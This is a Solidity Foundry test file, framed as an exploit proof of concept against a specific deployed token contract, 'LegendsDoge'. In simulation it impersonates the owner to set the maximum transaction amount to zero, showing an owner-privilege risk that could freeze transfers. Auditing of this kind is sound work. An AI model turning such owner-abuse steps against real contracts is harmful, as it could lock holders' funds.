// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface LegendsDoge {
    function _owner() external view returns (address);
    function setMaxTxPercent(uint256 maxTxPercent) external;
    function _maxTxAmount() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xCd092F1f9858204d7986b3a2e36730fF1229a2e5;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use the already deployed contract at TARGET
        // We need to find the owner first
        address owner = LegendsDoge(TARGET)._owner();
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "LegendsDoge Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Get the current owner
        address owner = LegendsDoge(TARGET)._owner();

        // Step 2: Impersonate the owner and set maxTxPercent to 0
        vm.prank(owner);
        LegendsDoge(TARGET).setMaxTxPercent(0);

        // Step 3: Verify _maxTxAmount is now 0
        uint256 maxTxAmount = LegendsDoge(TARGET)._maxTxAmount();
        assertEq(maxTxAmount, 0, "_maxTxAmount should be 0 after owner abuse");
        assertEq(maxTxAmount, 0, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
